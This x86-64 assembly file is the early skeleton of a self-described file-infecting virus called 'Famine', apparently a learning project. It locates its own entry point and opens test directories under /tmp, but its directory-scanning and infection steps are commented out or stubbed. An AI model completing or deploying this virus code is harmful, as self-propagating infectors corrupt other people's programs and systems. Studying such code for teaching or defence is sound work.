section.text:
	global _start:function

;-------------------------------------------------------------------------------
;|   r8   | virus entry                                                        |
;|   r9   | end of virus (without params)                                      |
;-------------------------------------------------------------------------------

;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

_start:
	call _inject; push addr to stack
%ifdef DEBUG; ==================================================================
	db `....FAMINE....`, 0x0

newline db `\n`, 0x0

_ft_strlen:; (string rsi)
	xor rax, rax; = 0
	_count_char:
		cmp byte [rsi + rax], 0
		jz _end_count_char
		inc rax
		jmp _count_char
	_end_count_char:
ret

_print:; (string rsi)
	call _ft_strlen
	push rax; mov rdx, rax
	pop rdx
	push 1; mov rax, 1
	pop rax; write
	push 1; mov rdi, 1
	pop rdi
	syscall

	push rsi
	lea rsi, [rel newline]
	push 1
	pop rax; write
	push 1
	pop rdx
	syscall
	pop rsi
ret

%endif; ========================================================================

_inject:
	pop rsi; pop addr from stack
	push rdx; save register
%ifdef DEBUG
	call _print
%endif
	sub rsi, 0x5; sub call instr
	push rsi; mov r8, rsi
	pop r8
; r8 contains the entry of the virus

	lea rsi, [rel directories]
	xor rcx, rcx; = 0
	_loop_dir:
		add rsi, rcx
		call _infect_dir
		xor rcx, rcx; = 0
		_seek_next_string:; seek next dir
			inc rcx
			cmp byte[rsi + rcx], 0x0
			jnz _seek_next_string
		inc rcx
		cmp byte[rsi + rcx], 0x0
		jnz _loop_dir

	xor rax, rax; = 0
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jnz _infected
	jmp _host

_infect_dir:; (string rsi)
%ifdef DEBUG
	call _print
%endif
	push rsi
	pop rdi
;	sub rsp, 1024; buffer of 1024 on stack
	push 2
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl _end_infect_dir; jump lower

	push rdi
	pop r10
	push rax
	pop rdi
;	push 78
;	pop rax; getdents
;	push 1024
;	pop rdx
;	mov rsi, rsp
;	syscall
	
	push 3
	pop rax; close
	syscall

	push r10
	pop rdi

	_end_infect_dir:
;	add rsp, 1024
	push rdi
	pop rsi
ret

_host:
	jmp _check_end
	_back_host:
		pop r9
; r9 contains the end of the virus (minus params)
	jmp _exit

_infected:
	jmp _exit

_exit:
	pop rdx
	pop r13
	pop r14
	pop r15

	mov rax, 60 ; exit
	mov rdi, 0
	syscall

directories db `/tmp/test/`, 0x0, `/tmp/test2/`, 0x0, 0x0
db `Famine version 1.0 (c)oded by lmartin`; sw4g signature

_check_end:
	call _back_host; push addr to stack

_params:
	vaddr dq 0x0
	entry_inject dq 0x0
	entry_prg dq 0x0
